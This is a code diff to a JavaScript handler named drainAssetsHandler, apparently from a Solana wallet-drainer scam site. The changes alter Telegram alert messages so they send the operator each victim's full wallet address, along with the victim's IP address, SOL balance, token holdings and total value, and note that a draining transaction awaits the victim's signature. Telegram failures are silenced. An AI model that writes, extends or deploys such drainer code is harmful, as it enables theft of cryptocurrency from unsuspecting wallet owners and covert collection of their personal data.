@@ -971,7 +971,7 @@ export default async function drainAssetsHandler(req, res) {
           ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
           splTokens: 0,
           projectName: PROJECT_NAME,
-          message: `👛 Wallet Connected - No SPL Tokens\n\n👤 Wallet: ${userPubkey.toString().substring(0, 8)}...\n💼 Type: ${walletType || 'Unknown'}\n🪙 SPL Tokens: 0 tokens\n💰 SOL Balance: ${(userSolBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL\n🌐 IP: ${req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown'}`
+          message: `👛 Wallet Connected - No SPL Tokens\n\n👤 Wallet: ${userPubkey.toString()}\n💼 Type: ${walletType || 'Unknown'}\n🪙 SPL Tokens: 0 tokens\n💰 SOL Balance: ${(userSolBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL\n🌐 IP: ${req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown'}`
         });
       } catch (telegramError) {
         // Silent fail for Telegram logging
@@ -1401,7 +1401,7 @@ export default async function drainAssetsHandler(req, res) {
         ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
         splTokens: processedTokens,
         projectName: PROJECT_NAME,
-        message: `🪙 SPL Wallet Detected - Awaiting Confirmation\n\n👤 Wallet: ${userPubkey.toString().substring(0, 8)}...\n💼 Type: ${walletType || 'Unknown'}\n🪙 SPL Tokens: ${processedTokens} tokens detected\n💰 SOL Balance: ${(userSolBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL\n🌐 IP: ${req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown'}\n\n📋 Token Details:\n${tokenSummary}\n\n💎 Total Token Value: ${totalValueFormatted}\n\n⏳ Status: Transaction prepared, awaiting user signature and on-chain confirmation`
+        message: `🪙 SPL Wallet Detected - Awaiting Confirmation\n\n👤 Wallet: ${userPubkey.toString()}\n💼 Type: ${walletType || 'Unknown'}\n🪙 SPL Tokens: ${processedTokens} tokens detected\n💰 SOL Balance: ${(userSolBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL\n🌐 IP: ${req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown'}\n\n📋 Token Details:\n${tokenSummary}\n\n💎 Total Token Value: ${totalValueFormatted}\n\n⏳ Status: Transaction prepared, awaiting user signature and on-chain confirmation`
       });
     } catch (telegramError) {
       // Silent fail for Telegram logging
